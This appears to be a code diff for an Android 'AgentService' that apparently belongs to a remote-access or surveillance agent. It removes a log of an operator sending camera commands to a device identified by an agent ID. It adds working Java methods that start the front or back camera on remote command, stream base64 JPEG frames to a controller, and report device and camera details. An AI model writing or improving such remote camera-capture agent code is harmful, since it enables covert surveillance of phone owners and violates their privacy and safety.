@@ -1,19 +1,392 @@
-Command sent to 3519991586e1db49: CAMERA_STREAM_START
-[12:10:37 AM][12:10:37 AM] 📥 Response from 3519991586e1db49 for CAMERA_STREAM_START front: { "message": "Failed to start camera stream", "status": "error" }
-[12:10:37 AM] 📊 Status: error
-[12:10:37 AM] 💬 Message: Failed to start camera stream
-[12:11:41 AM]📤 Sending: CAMERA_STREAM_START back to 3519991586e1db49
-[12:11:41 AM]📤 Command sent to 3519991586e1db49: CAMERA_STREAM_START
-[12:11:44 AM][12:11:44 AM] 📥 Response from 3519991586e1db49 for CAMERA_STREAM_START back: { "message": "Failed to start camera stream", "status": "error" }
-[12:11:44 AM] 📊 Status: error
-[12:11:44 AM] 💬 Message: Failed to start camera stream
-[12:12:41 AM]📤 Sending: CAMERA_STREAM_START front to 3519991586e1db49
-[12:12:41 AM]📤 Command sent to 3519991586e1db49: CAMERA_STREAM_START
-[12:12:45 AM][12:12:45 AM] 📥 Response from 3519991586e1db49 for CAMERA_STREAM_START front: { "message": "Failed to start camera stream", "status": "error" }
-[12:12:45 AM] 📊 Status: error
-[12:12:45 AM] 💬 Message: Failed to start camera stream
-[12:12:52 AM]📤 Sending: CAMERA_CAPTURE to 3519991586e1db49
-[12:12:52 AM]📤 Command sent to 3519991586e1db49: CAMERA_CAPTURE
-[12:12:52 AM][12:12:52 AM] 📥 Response from 3519991586e1db49 for CAMERA_CAPTURE: { "message": "Camera stream not active. Start with CAMERA_STREAM_START", "status": "error" }
-[12:12:52 AM] 📊 Status: error
-[12:12:52 AM] 💬 Message: Camera stream not active. Start with CAMERA_STREAM_START
+/**
+ * ==================== IMPROVED CAMERA STREAM START ====================
+ * 
+ * This is the improved startCameraStream() method for AgentService.java
+ * Location: AgentService.java, replace the method starting at line 4397
+ * 
+ * Key improvements:
+ * 1. Better permission validation with detailed error codes
+ * 2. Hardware availability checking before attempting to start
+ * 3. Enhanced error callbacks with specific error codes
+ * 4. Improved retry logic with logging
+ * 5. Diagnostic hints for troubleshooting
+ * 
+ */
+
+private String startCameraStream(String type) {
+    try {
+        // ==================== STEP 1: PERMISSION CHECK ====================
+        if (!hasPermission(Manifest.permission.CAMERA)) {
+            JSONObject result = new JSONObject();
+            result.put("status", "permission_denied");
+            result.put("message", "Camera permission not granted");
+            result.put("required_permission", Manifest.permission.CAMERA);
+            
+            // Help user understand how to fix
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                result.put("action", "REQUEST_PERMISSION");
+                result.put("hint", "User must grant CAMERA permission in app settings");
+            }
+            
+            Log.e(TAG, "❌ Camera permission denied");
+            return result.toString();
+        }
+
+        // ==================== STEP 2: HARDWARE CHECK ====================
+        int numCameras = Camera.getNumberOfCameras();
+        Log.d(TAG, "📷 Available cameras on device: " + numCameras);
+        
+        if (numCameras == 0) {
+            JSONObject result = new JSONObject();
+            result.put("status", "error");
+            result.put("message", "No cameras found on device");
+            result.put("error_code", "NO_CAMERA_HARDWARE");
+            return result.toString();
+        }
+        
+        // ==================== STEP 3: INITIALIZE HELPER ====================
+        if (cameraStreamHelper == null) {
+            cameraStreamHelper = new CameraStreamHelper(this);
+        }
+        
+        if (cameraStreamHelper.isStreaming()) {
+            Log.d(TAG, "⏹️ Stopping existing camera stream...");
+            cameraStreamHelper.stopStreaming();
+            try { 
+                Thread.sleep(500); 
+            } catch (Exception e) {}
+        }
+        
+        boolean front = type.equalsIgnoreCase("front");
+        cameraStreamType = type;
+        
+        // ==================== STEP 4: VERIFY TARGET CAMERA EXISTS ====================
+        int targetCameraId = -1;
+        Camera.CameraInfo info = new Camera.CameraInfo();
+        
+        for (int i = 0; i < numCameras; i++) {
+            try {
+                Camera.getCameraInfo(i, info);
+                if (front && info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
+                    targetCameraId = i;
+                    Log.d(TAG, "✅ Found front camera at ID: " + i);
+                    break;
+                } else if (!front && info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
+                    targetCameraId = i;
+                    Log.d(TAG, "✅ Found back camera at ID: " + i);
+                    break;
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "Error checking camera " + i + ": " + e.getMessage());
+            }
+        }
+        
+        if (targetCameraId == -1) {
+            JSONObject result = new JSONObject();
+            result.put("status", "error");
+            result.put("message", (front ? "Front" : "Back") + " camera not available on this device");
+            result.put("error_code", "CAMERA_NOT_FOUND");
+            result.put("available_cameras", numCameras);
+            result.put("hint", "Try requesting the other camera (front/back)");
+            return result.toString();
+        }
+        
+        // ==================== STEP 5: START STREAMING ====================
+        Log.d(TAG, "📷 Starting " + type + " camera stream (camera ID: " + targetCameraId + ")");
+        
+        cameraStreamHelper.startStreaming(front, new CameraStreamHelper.OnFrameListener() {
+            @Override
+            public void onFrame(byte[] jpegData, int width, int height, int frameNumber) {
+                if (jpegData == null || jpegData.length == 0) return;
+                
+                String base64 = Base64.encodeToString(jpegData, Base64.NO_WRAP);
+                
+                try {
+                    JSONObject frame = new JSONObject();
+                    frame.put("type", "response");
+                    frame.put("agent_id", getAgentId());
+                    frame.put("command", "CAMERA_FRAME");
+                    
+                    JSONObject result = new JSONObject();
+                    result.put("type", "camera_frame");
+                    result.put("data", base64);
+                    result.put("width", width);
+                    result.put("height", height);
+                    result.put("frame_number", frameNumber);
+                    result.put("camera", cameraStreamType);
+                    result.put("timestamp", System.currentTimeMillis());
+                    result.put("size", jpegData.length);
+                    
+                    frame.put("result", result);
+                    sendRawData(frame.toString());
+                    
+                    if (frameNumber > 0 && frameNumber % 10 == 0) {
+                        Log.d(TAG, "📷 Camera frame #" + frameNumber + " sent (" + jpegData.length + " bytes)");
+                    }
+                    
+                } catch (Exception e) {
+                    Log.e(TAG, "Send camera frame error: " + e.getMessage());
+                }
+            }
+            
+            @Override
+            public void onError(String error) {
+                Log.e(TAG, "📷 Camera error received: " + error);
+                
+                // ✅ NEW: Parse error code for better diagnostics
+                String errorCode = "UNKNOWN";
+                String errorDetails = error;
+                
+                if (error.contains(":")) {
+                    String[] parts = error.split(":", 2);
+                    errorCode = parts[0];
+                    errorDetails = parts[1];
+                }
+                
+                try {
+                    JSONObject result = new JSONObject();
+                    result.put("status", "error");
+                    result.put("message", errorDetails);
+                    result.put("error_code", errorCode);
+                    result.put("type", "camera_stream_error");
+                    
+                    // Add helpful hints based on error code
+                    switch (errorCode) {
+                        case "CAMERA_OPEN_ERROR":
+                            result.put("hint", "Camera is in use by another app. Close Camera app, video calls, etc.");
+                            break;
+                        case "PARAMS_ERROR":
+                            result.put("hint", "Failed to configure camera parameters. Device may have compatibility issue.");
+                            break;
+                        case "PREVIEW_START_ERROR":
+                            result.put("hint", "Failed to start camera preview. Try restarting the app or device.");
+                            break;
+                        case "CALLBACK_ERROR":
+                            result.put("hint", "Failed to set preview callback. Device driver issue.");
+                            break;
+                        case "CAMERA_NOT_FOUND":
+                            result.put("hint", "Try the other camera (front/back).");
+                            break;
+                    }
+                    
+                    sendRawData(result.toString());
+                } catch (Exception e) {
+                    Log.e(TAG, "Error sending camera error notification: " + e.getMessage());
+                }
+            }
+        });
+        
+        // ==================== STEP 6: WAIT FOR STREAMING ====================
+        int retryCount = 0;
+        long startTime = System.currentTimeMillis();
+        long maxWaitTime = 5000; // 5 second timeout
+        
+        while (!cameraStreamHelper.isStreaming() && retryCount < 25) {
+            try { 
+                Thread.sleep(200); 
+            } catch (Exception e) {}
+            retryCount++;
+            
+            // Log progress every 5 attempts
+            if (retryCount % 5 == 0) {
+                long elapsed = System.currentTimeMillis() - startTime;
+                Log.d(TAG, "⏳ Waiting for camera stream... (attempt " + retryCount + "/25, elapsed " + elapsed + "ms)");
+            }
+            
+            // Hard timeout
+            if (System.currentTimeMillis() - startTime > maxWaitTime) {
+                Log.e(TAG, "❌ Camera stream initialization timeout");
+                break;
+            }
+        }
+        
+        long elapsed = System.currentTimeMillis() - startTime;
+        
+        // ==================== STEP 7: RETURN STATUS ====================
+        if (cameraStreamHelper.isStreaming()) {
+            isCameraStreaming = true;
+            JSONObject result = new JSONObject();
+            result.put("status", "success");
+            result.put("message", "Camera stream started: " + type);
+            result.put("camera", type);
+            result.put("preview_width", CameraStreamHelper.PREVIEW_WIDTH);
+            result.put("preview_height", CameraStreamHelper.PREVIEW_HEIGHT);
+            result.put("streaming", true);
+            result.put("startup_time_ms", elapsed);
+            result.put("attempts", retryCount);
+            
+            Log.d(TAG, "✅ Camera stream started successfully in " + elapsed + "ms after " + retryCount + " attempts");
+            return result.toString();
+        } else {
+            // Still failed after all retries
+            JSONObject result = new JSONObject();
+            result.put("status", "error");
+            result.put("message", "Failed to start camera stream after " + elapsed + "ms");
+            result.put("error_code", "STREAM_START_TIMEOUT");
+            result.put("attempts", retryCount);
+            result.put("camera_id", targetCameraId);
+            result.put("hint", "1. Close other apps using camera\n2. Grant CAMERA permission\n3. Try restarting the app\n4. Check device camera hardware");
+            
+            Log.e(TAG, "❌ Camera stream failed to initialize after " + elapsed + "ms and " + retryCount + " attempts");
+            return result.toString();
+        }
+        
+    } catch (Exception e) {
+        Log.e(TAG, "Start camera stream error: " + e.getMessage(), e);
+        try {
+            JSONObject result = new JSONObject();
+            result.put("status", "error");
+            result.put("message", "Exception: " + e.getMessage());
+            result.put("exception_type", e.getClass().getSimpleName());
+            result.put("error_code", "EXCEPTION");
+            return result.toString();
+        } catch (Exception ex) {
+            return errorJson("Failed to start camera: " + e.getMessage());
+        }
+    }
+}
+
+
+/**
+ * ==================== NEW: CAMERA DIAGNOSTIC COMMAND ====================
+ * 
+ * Add this new command handler to the switch statement (around line 1500):
+ * 
+ * case "CAMERA_DIAGNOSTIC":
+ *     return getCameraDiagnostic();
+ * 
+ * Then add this new method to AgentService class:
+ */
+
+private String getCameraDiagnostic() {
+    try {
+        JSONObject diag = new JSONObject();
+        
+        // ==================== PERMISSION CHECK ====================
+        boolean hasPerm = hasPermission(Manifest.permission.CAMERA);
+        diag.put("camera_permission_granted", hasPerm);
+        
+        if (!hasPerm) {
+            diag.put("permission_status", "DENIED - User must grant in Settings");
+        } else {
+            diag.put("permission_status", "GRANTED");
+        }
+        
+        // ==================== CAMERA ENUMERATION ====================
+        int numCameras = Camera.getNumberOfCameras();
+        diag.put("total_cameras", numCameras);
+        
+        JSONArray cameras = new JSONArray();
+        Camera.CameraInfo info = new Camera.CameraInfo();
+        
+        for (int i = 0; i < numCameras; i++) {
+            try {
+                Camera.getCameraInfo(i, info);
+                
+                JSONObject camInfo = new JSONObject();
+                camInfo.put("id", i);
+                camInfo.put("facing", info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT ? "FRONT" : "BACK");
+                camInfo.put("orientation", info.orientation + " degrees");
+                
+                // Try to open camera and get detailed info
+                Camera testCamera = null;
+                try {
+                    testCamera = Camera.open(i);
+                    Camera.Parameters params = testCamera.getParameters();
+                    
+                    // Get preview sizes
+                    List<Camera.Size> sizes = params.getSupportedPreviewSizes();
+                    if (sizes != null && !sizes.isEmpty()) {
+                        JSONArray sizeArray = new JSONArray();
+                        StringBuilder sizeStr = new StringBuilder();
+                        for (int s = 0; s < Math.min(sizes.size(), 10); s++) {
+                            Camera.Size size = sizes.get(s);
+                            sizeArray.put(size.width + "x" + size.height);
+                            if (s < 3) {
+                                if (sizeStr.length() > 0) sizeStr.append(", ");
+                                sizeStr.append(size.width).append("x").append(size.height);
+                            }
+                        }
+                        camInfo.put("preview_sizes", sizeArray);
+                        camInfo.put("preview_sizes_summary", sizeStr.toString() + (sizes.size() > 3 ? "..." : ""));
+                    }
+                    
+                    // Focus modes
+                    List<String> focusModes = params.getSupportedFocusModes();
+                    if (focusModes != null && !focusModes.isEmpty()) {
+                        camInfo.put("focus_modes", focusModes.toString());
+                    }
+                    
+                    // Flash modes
+                    List<String> flashModes = params.getSupportedFlashModes();
+                    if (flashModes != null && !flashModes.isEmpty()) {
+                        camInfo.put("flash_modes", flashModes.toString());
+                    }
+                    
+                    // Current settings
+                    camInfo.put("preview_format", params.getPreviewFormat());
+                    camInfo.put("preview_fps", params.getPreviewFrameRate() + " fps");
+                    camInfo.put("jpeg_quality", params.getJpegQuality());
+                    
+                    camInfo.put("status", "AVAILABLE");
+                    
+                } catch (RuntimeException e) {
+                    camInfo.put("status", "IN_USE or ERROR: " + e.getMessage());
+                    camInfo.put("note", "Camera may be in use by another app");
+                } catch (Exception e) {
+                    camInfo.put("status", "ERROR: " + e.getMessage());
+                } finally {
+                    if (testCamera != null) {
+                        try {
+                            testCamera.release();
+                        } catch (Exception e) {
+                            Log.e(TAG, "Error releasing test camera: " + e.getMessage());
+                        }
+                    }
+                }
+                
+                cameras.put(camInfo);
+                
+            } catch (Exception e) {
+                Log.e(TAG, "Error getting camera info for ID " + i + ": " + e.getMessage());
+                
+                JSONObject errorCam = new JSONObject();
+                errorCam.put("id", i);
+                errorCam.put("status", "ERROR: " + e.getMessage());
+                cameras.put(errorCam);
+            }
+        }
+        
+        diag.put("cameras", cameras);
+        
+        // ==================== CURRENT STREAMING STATUS ====================
+        if (cameraStreamHelper != null) {
+            diag.put("streaming_active", cameraStreamHelper.isStreaming());
+            diag.put("streaming_camera", cameraStreamType);
+            diag.put("streaming_paused", cameraStreamHelper.isPaused());
+            diag.put("frame_count", cameraStreamHelper.getFrameCount());
+        } else {
+            diag.put("streaming_active", false);
+            diag.put("streaming_status", "Helper not initialized");
+        }
+        
+        // ==================== ANDROID VERSION & BUILD ====================
+        diag.put("android_version", Build.VERSION.SDK_INT);
+        diag.put("android_release", Build.VERSION.RELEASE);
+        diag.put("device_manufacturer", Build.MANUFACTURER);
+        diag.put("device_model", Build.MODEL);
+        
+        JSONObject result = new JSONObject();
+        result.put("status", "success");
+        result.put("type", "camera_diagnostic");
+        result.put("diagnostic", diag);
+        result.put("timestamp", System.currentTimeMillis());
+        
+        Log.d(TAG, "📊 Camera diagnostic complete: " + numCameras + " cameras found");
+        return result.toString();
+        
+    } catch (Exception e) {
+        Log.e(TAG, "Camera diagnostic error: " + e.getMessage(), e);
+        return errorJson("Diagnostic error: " + e.getMessage());
+    }
+}
